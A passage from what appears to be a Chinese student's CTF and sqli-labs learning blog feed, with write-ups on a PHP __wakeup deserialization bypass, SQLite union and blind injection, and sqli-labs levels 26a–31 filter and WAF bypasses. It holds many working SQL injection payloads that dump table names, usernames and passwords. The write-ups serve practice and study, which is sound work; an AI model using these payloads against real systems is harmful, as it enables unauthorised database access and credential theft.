class="hljs-string">&quot;HaHaHa&quot;</span>：表示这是一个类名为HaHaHa的对象，类名长度为<span class="hljs-number">6</span>。  <br><span class="hljs-attribute">3</span>：表示对象有<span class="hljs-number">3</span>个属性。  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;：第一个属性名为admin，值为admin。  <br><span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;：第二个属性名为passwd，值为wllm。  <br></code></pre></td></tr></table></figure><p>这个payload能够绕过__wakeup()方法的原因可能与PHP反序列化过程中的一些特性或漏洞有关，比如属性个数不匹配（CVE-2016-7124）。<br>在这个漏洞中，如果序列化字符串中指定的属性个数比实际类中定义的属性个数多，PHP在反序列化时可能会绕过__wakeup()方法的执行。</p><p><strong>绕过原理</strong><br>由于修改了属性个数，PHP在反序列化时会跳过__wakeup()方法的执行。因此，passwd属性的值不会被SHA-1哈希处理，而是直接保留为wllm。当对象被销毁时，__destruct()方法会检查admin和passwd的值，发现它们满足条件，从而包含flag.php并输出flag。<br>通过这种方式，攻击者成功绕过了__wakeup()方法，直接设置了所需的属性值，触发了敏感文件的包含。</p><p>我的理解就是：<br>构造一个被java序列化后的数值来满足条件，并且使用定义与实际的的属性个数不同来绕过wakeup(),因为wakeup根本就是不想让你过的</p><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:10:”wllm”;}<br>其中s是字符串长度，2代表里面有两个元素：admin&#x3D;admin，passwd&#x3D;wllm。<br>吧2改成其它超过实际元素的值即可绕过wakeup()<br>就是要大过2，不知道为什么不能小于2</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlite</title>
    <link href="/2025/03/18/sqlite/"/>
    <url>/2025/03/18/sqlite/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlite注入"><a href="#sqlite注入" class="headerlink" title="sqlite注入"></a>sqlite注入</h1><p>做到一道题目<br>[GHCTF 2025]SQL???<br>才知道有sqlite，记录一下sqlite怎么注入  </p><h2 id="什么是sqlite"><a href="#什么是sqlite" class="headerlink" title="什么是sqlite"></a>什么是sqlite</h2><p>SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。它是一个零配置的数据库，这意味着与其他数据库不一样，您不需要在系统中配置。<br>就像其他数据库，SQLite 引擎不是一个独立的进程，可以按应用程序需求进行静态或动态连接。SQLite 直接访问其存储文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#查询字段数</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3;</span><br><span class="hljs-string">1&#x27;</span> order by <span class="hljs-number">3</span>;<br><span class="hljs-comment">#查版本</span><br><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,sqlite_version();</span><br><span class="hljs-string">#查询表名和列名 通过查询 sqlite_master 表来实现：</span><br><span class="hljs-string">-1&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select sql <span class="hljs-keyword">from</span> sqlite_master limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>;<br><span class="hljs-comment">#当存在多个表时，我们可以用 limit 关键字逐行读取，也可以使用 group_concat 关键字进行聚合：</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(sql) from sqlite_master),4;</span><br><span class="hljs-string">0&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,tbl_name FROM sqlite_master  limit <span class="hljs-number">2</span> offset <span class="hljs-number">1</span> --<br><span class="hljs-comment">#查询数据</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(username,password) from table_name),4;</span><br><span class="hljs-string"></span><br><span class="hljs-string">布尔盲注</span><br><span class="hljs-string">#根据查询正确或错误时的页面回显来判断数据内容： </span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> length(sqlite_version())=<span class="hljs-number">5</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or length(sqlite_version())=6/*</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> substr((select group_concat(sql) <span class="hljs-keyword">from</span> sqlite_master),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or substr((select group_concat(sql) from sqlite_master),1,1)&lt;&#x27;</span>a<span class="hljs-string">&#x27;/*</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> substr((select group_concat(sql) <span class="hljs-keyword">from</span> sqlite_master),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;b&#x27;</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or substr((select group_concat(sql) from sqlite_master),2,1)&lt;&#x27;</span><span class="hljs-string">b&#x27;/*</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> substr((select group_concat(sql) <span class="hljs-keyword">from</span> sqlite_master),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;C&#x27;</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or substr((select group_concat(sql) from sqlite_master),3,1)&lt;&#x27;</span>C<span class="hljs-string">&#x27;/*</span><br><span class="hljs-string">......</span><br><span class="hljs-string"></span><br><span class="hljs-string">时间盲注</span><br><span class="hljs-string">#QLite 没有 sleep() 函数，但是有个 randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。</span><br><span class="hljs-string">并且 SQLite 没有 if，所以我们需要使用 case...when 来构造查询语句：</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">case</span> when(substr(sqlite_version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;3&#x27;</span>) then randomblob(<span class="hljs-number">1000000000</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> end)/*<br><br>by<br><br>https://blog.csdn.net/<span class="hljs-number">2201_75824562</span>/article/details/<span class="hljs-number">139362754</span><br></code></pre></td></tr></table></figure><p>所以原题的payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> //测试回显<br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">sql</span>) <span class="hljs-keyword">from</span> sqlite_master) //这样就可以直接查询表名和字段名<br>回显：<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> &quot;flag&quot; ( &quot;flag&quot; <span class="hljs-type">TEXT</span> ),<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> &quot;users&quot; ( &quot;id&quot; <span class="hljs-type">INTEGER</span>, &quot;username&quot; <span class="hljs-type">TEXT</span>, &quot;email&quot; <span class="hljs-type">TEXT</span>, &quot;phone&quot; <span class="hljs-type">TEXT</span>, &quot;address&quot; <span class="hljs-type">TEXT</span> )<br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,(<span class="hljs-keyword">select</span> group_concat(flag) <span class="hljs-keyword">from</span> flag)<br>//拿到flag<br></code></pre></td></tr></table></figure><p>没做过滤，数字型注入，可能是想让人认识sqlite的题目吧🤗</p>]]></content>
    
    
    
    <tags>
      
      <tag>notice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-nssctf-01</title>
    <link href="/2025/03/17/note-nssctf-01/"/>
    <url>/2025/03/17/note-nssctf-01/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>题目说参数为nss，get传nss&#x3D;1<br>提示要用更安全的传参法，那就post了<br>post:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //报错</span><br><span class="hljs-string">nss=1&#x27;</span><span class="hljs-comment">#  //成功闭合</span><br></code></pre></td></tr></table></figure><p>用联合注入发现被过滤了union，空格<br>双写绕过即可<br>爆字段payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-string">&#x27; uunionnion/**/select/**/1,database(),group_concat(column_name)from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>NSS_tb<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>到这步就差不多了</p>]]></content>
    
    
    
    <tags>
      
      <tag>nssctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-14</title>
    <link href="/2025/03/16/note-14/"/>
    <url>/2025/03/16/note-14/</url>
    
    <content type="html"><![CDATA[<h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>测试出闭合点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=1&#x27;);%00<br></code></pre></td></tr></table></figure><p>然后看一眼源码的过滤  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><p>这辉大小写绕过就没用了，<br>而且好像是这两同时出现成union select 时才会触发过滤<br>这样的话双写绕过就有点难吧<br>但是明白了原理，根据过滤机制进行绕过就ok  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=0&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,2,3;%00<br></code></pre></td></tr></table></figure><p>有点奇葩，但确实能用<br>也可以选择报错注入好像(不行，没有报错)，不试了  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="hljs-string">&#x27;;%00</span><br><span class="hljs-string">?id=0&#x27;</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>Auunion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselectnion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselect<span class="hljs-operator">%</span><span class="hljs-number">0</span>A1,database(),group_concat(column_name)<span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Ainformation_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">0</span>Awhere<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Aand<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(id,username,password)from%0Asecurity.users;%00</span><br></code></pre></td></tr></table></figure><h1 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h1><p>看一眼源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);//strip out /*</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><p>好像只对union select 进行了过滤</p><p>payload</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">0</span>&#x27;)ununion selection <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>比上关更简单，只过了union select，其它都没过滤  </p><h1 id="less29-waf过滤"><a href="#less29-waf过滤" class="headerlink" title="less29 waf过滤"></a>less29 waf过滤</h1><blockquote><p>从29到31关，要用到启动tomcat作为过滤服务器，确定参数安全后才交给apache服务器。只需将sqli-labs文件夹下的tomcat-files.zip解压到tomcat&#x2F;webapp&#x2F;ROOT目录下，启动tomcat&#x2F;bin下的startup.bat即可(关闭为shutdown.bat)。<br>by<br><a href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/kukudeshuo/article/details/114763700">https://blog.csdn.net/kukudeshuo/article/details/114763700</a></p></blockquote><p>我没有跟博客去配置tomcat，但是直接用login.php来进行测试<br>好像就是同样效果，那我直接当它配置好了吧  </p><p>那就是输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/sqli-labs/Less-29/login.php?id=1   //回显正常<br>/sqli-labs/Less-29/login.php?id=1&#x27;  //会转到hacked.php<br></code></pre></td></tr></table></figure><p>那大概就是waf成功阻止了此次注入<br>那就要想办法绕过waf了  </p><blockquote><p>由于tomcat和apache解析参数的顺序不同，当注入两个参数?id&#x3D;1&amp;id&#x3D;2，此时tomcat解析的是第一个参数，而apache解析的是第二个参数并且SQL语句也是在apache服务器上执行的，由此绕过tomcat的检测。<br>by<br><a href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p></blockquote><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>login.php<span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>&#x27;<span class="hljs-operator">--+</span><br><span class="hljs-comment">//回显</span><br><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>的内容<br></code></pre></td></tr></table></figure><p>直接构造</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/sqli-labs/Less<span class="hljs-number">-29</span>/login.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>成功</p><h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>Web应用程序防火墙（Web Application Firewall，WAF）是一种用于保护Web应用程序的安全设备。Web应用程序是指通过Web浏览器或其他Web客户端访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。</p><h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>和上一关一样有waf，但好像没有id的话就不会有回显</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-30</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">3</span>&amp;id=<span class="hljs-number">0</span>&quot;union select 1,2,3--+<br><br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>看了源码还差点找不到注入点😥….</p><h1 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h1><p>waf<br>闭合点</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-31</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span>&quot;) union select 1,2,3--+<br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;)<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>按原计划，sql-labs的学习就先到这，下面sql注入的学习该去做ctf真题了，不得不说sqli-labs的帮助真挺大，能打好sql注入的原理和基础</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-13</title>
    <link href="/2025/03/15/note-13/"/>
    <url>/2025/03/15/note-13/</url>
    
    <content type="html"><![CDATA[<h1 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h1><p>网上博客是说用%a0来代替空格，但是我这环境好像解析不了，<br>也不能用报错注入。<br>最后试出来能用来盲注的payload就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;)||if(length(database())=8,1,0);%00</span><br></code></pre></td></tr></table></figure><p>结果牛大b了，在后面27在同样过滤了空格的情况下用其它如%a0能正确解析,可能是我的关卡文件有问题；<br>那不管了，直接做less27。  </p><h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>这题过滤对大小写没考虑，可以直接大小写绕过<br>题目好像把符号过滤了，用id&#x3D;-1会变成1，注意要用数据库没用的值<br>题目过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out UNION</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out SELECT</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out Union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,3;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(table_name)%0Afrom%0AinfoRmation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(column_name)%0Afrom%0AinfoRmation_schema.columns%0Awhere%0Atable_name=&#x27;users&#x27;%0Aand%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(id,username,passwOrd )%0Afrom%0Ausers;%00<br></code></pre></td></tr></table></figure><h1 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h1><p>依旧没用过滤大小写，区别是没用报错回显，不能用报错注入。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,2,3;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(table_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.tables%0Awhere<span class="hljs-variable">%0Atable_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;<span class="hljs-variable">%00</span><br>?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(column_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.columns%0Awhere<span class="hljs-variable">%0Atable_name</span>=&#x27;users&#x27;%0Aand<span class="hljs-variable">%0Atable_schema</span>=&#x27;security&#x27;;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(id,username,password)from<span class="hljs-variable">%0Ausers</span>;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
